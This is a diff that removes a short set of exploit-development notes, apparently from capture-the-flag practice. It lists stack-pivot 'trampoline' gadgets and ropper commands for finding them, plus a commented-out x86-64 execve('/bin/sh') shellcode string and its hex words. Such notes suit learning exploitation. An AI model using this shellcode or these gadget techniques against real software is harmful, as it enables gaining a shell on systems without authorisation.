@@ -1,31 +1,0 @@
-Code trampoline ideas
-
-jmp espcall esppush esp; retmov eax, esp; jmp eaxxchg eax, esp; call eaxpush esp; pop ebx; jmp ebx… etc … etc … etc ...
-
-
-Ropper is helpful here	ropper -f <inputfile>
-		List lots of instructions (extremely verbose)
-
-	ropper -f <inputfile> -j <reg>
-		Find “jmp <reg>” instructions
-	ropper -f <inputfile> --opcode <hex>
-		Find specific opcode bytes
-		
-		
-		
-		
-
-add_them_up or read_nums 
-
-
-
-
-
-
-
-
-#SHELLCORRECT = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
-
-
-['', '6e69622f', '732f2f2f', 'e7894850', '01697268', '24348101', '01010101', '6a56f631', '01485e08', '894856e6', '6ad231e6', '050f583b']
-
